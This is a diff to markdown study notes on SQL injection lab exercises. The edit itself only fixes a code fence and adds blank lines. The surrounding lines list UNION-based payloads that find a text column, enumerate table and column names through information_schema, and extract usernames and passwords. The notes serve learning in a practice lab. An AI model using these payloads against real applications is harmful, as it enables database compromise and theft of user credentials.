@@ -74,9 +74,7 @@ After:
 ```md
 ## 🧠 Real-World Impact
 SQL Injection can lead to full database compromise, data leakage, and in some cases remote code execution depending on database permissions.
-
-
-
+```
 ## Lab: SQL Injection UNION Attack — Finding Column with Text
 **Technique:** ORDER BY to find column count, UNION SELECT to find string column
 **Key payload:** `'+UNION+SELECT+NULL,'DI0tMU',NULL--+-`
@@ -112,3 +110,6 @@ SQL Injection can lead to full database compromise, data leakage, and in some ca
 - Columns: `'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name+LIKE+'users_ddzebl'--+-`
 - Data: `'+UNION+SELECT+username_maxijo,password_adramj+FROM+users_ddzebl--+-`
 **What I learned:** Full enumeration chain — tables → columns → data extraction
+
+
+
